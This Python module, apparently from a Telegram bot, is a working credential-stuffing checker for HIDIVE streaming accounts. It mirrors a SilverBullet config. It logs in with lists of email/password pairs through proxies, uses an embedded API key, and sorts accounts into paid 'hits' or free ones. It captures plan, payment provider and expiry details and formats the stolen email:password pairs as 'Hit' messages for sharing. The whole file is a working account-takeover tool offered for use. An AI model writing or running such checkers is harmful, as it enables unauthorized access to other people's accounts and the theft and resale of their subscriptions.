"""
bot/modules/hidive.py
~~~~~~~~~~~~~~~~~~~~~
Hidive account checker – mirrors the SilverBullet ``HIDIVE BY @XD_HR``
config exactly (same endpoints, headers, capture fields, hit/free logic).

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``loop.run_in_executor()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
from datetime import datetime
from typing import Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from bot.utils.logger import setup_logger

log = setup_logger("mod.hidive")

# ── API constants (from SB config) ──────────────────────────────────────
_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
_APP_VAR = "6.58.0.a0c6b52"

_BASE = "https://dce-frontoffice.imggaming.com"

# Retry on transient HTTP errors so valid accounts aren't lost.
_RETRY = Retry(
    total=2,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET", "POST"],
    raise_on_status=False,
)


def _make_session() -> requests.Session:
    """Create a Session with automatic retries on transient errors."""
    session = requests.Session()
    adapter = HTTPAdapter(max_retries=_RETRY)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


def _make_headers() -> dict[str, str]:
    """Return the full header dict matching the SB config."""
    return {
        "Host": "dce-frontoffice.imggaming.com",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Realm": "dce.hidive",
        "x-app-var": _APP_VAR,
        "Accept-Language": "en-US",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/137.0.0.0 Mobile Safari/537.36"
        ),
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "app": "dice",
        "x-api-key": _API_KEY,
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://www.hidive.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "Referer": "https://www.hidive.com/",
        "Accept-Encoding": "gzip, deflate, br",
    }


# ── Parsing helpers (match SB parse behaviour) ─────────────────────────

def _find_json_value(obj: object, key: str) -> object:
    """Recursively find the first value for *key* in a JSON tree.

    Returns the value if found (including ``None``), or the sentinel
    ``_MISSING`` if the key does not exist anywhere in the tree.
    Callers should check ``result is not _MISSING``.
    """
    if isinstance(obj, dict):
        if key in obj:
            val = obj[key]
            # Return scalars and None; skip dicts/lists (search deeper).
            if val is None or isinstance(val, (str, int, float, bool)):
                return val
        for v in obj.values():
            result = _find_json_value(v, key)
            if result is not None:
                return result
    elif isinstance(obj, list):
        for item in obj:
            result = _find_json_value(item, key)
            if result is not None:
                return result
    return None


def _lr_parse(text: str, left: str, right: str) -> str:
    """Extract substring between *left* and *right* markers.

    Matches SilverBullet's ``PARSE "<SOURCE>" LR "left" "right"``
    behaviour.  Returns empty string if either marker is not found.
    """
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ""


# ── Synchronous check (mirrors SB config exactly) ──────────────────────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Hidive account.

    Returns
    -------
    dict with capture fields  – for ACTIVE (hit) accounts
    dict with ``free=True``   – for INACTIVE / no-subscription (free) accounts
    ``None``                  – for bad credentials / errors
    """
    session = _make_session()
    headers = _make_headers()

    try:
        # ── 1. LOGIN ────────────────────────────────────────────────────
        r1 = session.post(
            f"{_BASE}/api/v2/login",
            json={"id": email, "secret": password},
            headers=headers, proxies=proxy, timeout=15,
        )

        # SB KEYCHECK: Success = "authorisationToken",
        #              Failure = "NOT_FOUND" | "failedAuthentication"
        r1_text = r1.text
        if "authorisationToken" not in r1_text:
            if ("failedAuthentication" in r1_text
                    or "NOT_FOUND" in r1_text
                    or r1.status_code == 401):
                return None
            return None

        try:
            token = r1.json()["authorisationToken"]
        except (ValueError, KeyError):
            return None
        headers["Authorization"] = f"Bearer {token}"

        # ── 2. ADDRESS → Country ────────────────────────────────────────
        # SB: PARSE "<SOURCE>" JSON "countryCode"  (recursive search)
        country = ""
        try:
            r_addr = session.get(
                f"{_BASE}/api/v2/user/address",
                headers=headers, proxies=proxy, timeout=10,
            )
            addr_data = r_addr.json()
            country = str(_find_json_value(addr_data, "countryCode") or "")
        except Exception:
            pass

        # ── 3. LICENCE-FAMILY → subscription data ──────────────────────
        r2 = session.get(
            f"{_BASE}/api/v2/licence-family"
            "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
            headers=headers, proxies=proxy, timeout=10,
        )
        r2_text = r2.text

        # -- Parse captures --
        plan_name = ""
        plan_type = ""
        auto_renewal = ""
        payment_provider = ""
        account_status = ""
        expiry_date = "N/A"
        days_left = "0"

        # ── Primary: direct path access to licenceFamilies[0] ──────────
        # This is the most reliable method — matches the actual API
        # structure.  Recursive search and LR parsing serve as fallbacks.
        data = None
        try:
            data = r2.json()
        except Exception:
            pass

        families = []
        if isinstance(data, dict):
            families = data.get("licenceFamilies", [])

        if families and isinstance(families, list) and len(families) > 0:
            fam = families[0]
            if isinstance(fam, dict):
                plan_name = str(fam.get("name") or "")
                plan_type = str(fam.get("type") or "")
                auto_renewal = str(fam.get("paymentEventType") or "")
                account_status = str(fam.get("status") or "")

                # paymentProviderInfo.type
                ppi = fam.get("paymentProviderInfo")
                if isinstance(ppi, dict):
                    payment_provider = str(ppi.get("type") or "")

                # expiryTimestamp → Expiry Date + Days Left
                expiry_ms = fam.get("expiryTimestamp")
                if expiry_ms and isinstance(expiry_ms, (int, float)):
                    try:
                        if expiry_ms > 0:
                            dt = datetime.fromtimestamp(expiry_ms / 1000)
                            expiry_date = dt.strftime("%Y-%m-%d")
                            days_left = str(
                                max(0, (dt - datetime.now()).days)
                            )
                    except Exception:
                        pass

        # ── Fallback: recursive JSON search if direct path missed ──────
        if not account_status and data:
            val = _find_json_value(data, "status")
            if val and isinstance(val, str):
                account_status = val
        if not plan_name and data:
            val = _find_json_value(data, "name")
            if val:
                plan_name = str(val)

        # ── Fallback: LR text parsing for status ──────────────────────
        if not account_status:
            chunk = _lr_parse(
                r2_text, '"displayStyle":', '"paymentProviderInfo"'
            )
            if chunk:
                account_status = _lr_parse(chunk, '"status":"', '",')
                if not account_status:
                    account_status = _lr_parse(
                        chunk, '"status":"', '"'
                    )

        # ── Fallback: LR for payment provider ─────────────────────────
        if not payment_provider:
            payment_provider = _lr_parse(
                r2_text,
                '"paymentProviderInfo":{"type":"',
                '"',
            )

        # ── Fallback: LR for expiry timestamp ─────────────────────────
        if expiry_date == "N/A":
            expiry_raw = _lr_parse(
                r2_text, '"expiryTimestamp":', ','
            )
            if expiry_raw:
                try:
                    ts = int(str(expiry_raw).strip().rstrip(',"'))
                    if ts > 0:
                        dt = datetime.fromtimestamp(ts / 1000)
                        expiry_date = dt.strftime("%Y-%m-%d")
                        days_left = str(
                            max(0, (dt - datetime.now()).days)
                        )
                except Exception:
                    pass

        # ── SB KEYCHECK ─────────────────────────────────────────────────
        # Success = Account Status is exactly "ACTIVE"
        # Custom "FREE" = Account Status is "INACTIVE" or empty
        # NOTE: SB uses "Contains ACTIVE" but "INACTIVE" also contains
        # "ACTIVE" as a substring — we use exact match to correctly
        # separate hits from free accounts.
        if account_status.upper() == "ACTIVE":
            return {
                "email": email,
                "password": password,
                "country": country,
                "plan": plan_name,
                "plan_type": plan_type,
                "auto_renewal": auto_renewal,
                "payment_provider": payment_provider,
                "account_status": account_status,
                "expiry": expiry_date,
                "days_left": days_left,
            }
        else:
            # INACTIVE / empty / no families → free account
            return {"email": email, "password": password, "free": True}

    except Exception as exc:
        log.debug("HD check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram message."""
    return (
        f"📺 **Hidive Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Country:** {hit.get('country', '')}\n"
        f"┣ **Plan:** {hit.get('plan', '')}\n"
        f"┣ **Plan Type:** {hit.get('plan_type', '')}\n"
        f"┣ **Auto Renewal:** {hit.get('auto_renewal', '')}\n"
        f"┣ **Payment:** {hit.get('payment_provider', '')}\n"
        f"┣ **Status:** {hit.get('account_status', '')}\n"
        f"┣ **Expiry:** {hit.get('expiry', 'N/A')}\n"
        f"┗ **Days Left:** {hit.get('days_left', '0')}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line capture format matching the SB sample exactly."""
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Country = {hit.get('country', '')} | "
        f"Plan = {hit.get('plan', '')} | "
        f"Plan Type = {hit.get('plan_type', '')} | "
        f"Has Auto Renewal = {hit.get('auto_renewal', '')} | "
        f"Payment Provider = {hit.get('payment_provider', '')} | "
        f"Account Status = {hit.get('account_status', '')} | "
        f"Expiry Date = {hit.get('expiry', 'N/A')} | "
        f"Days Left = {hit.get('days_left', '0')}"
    )
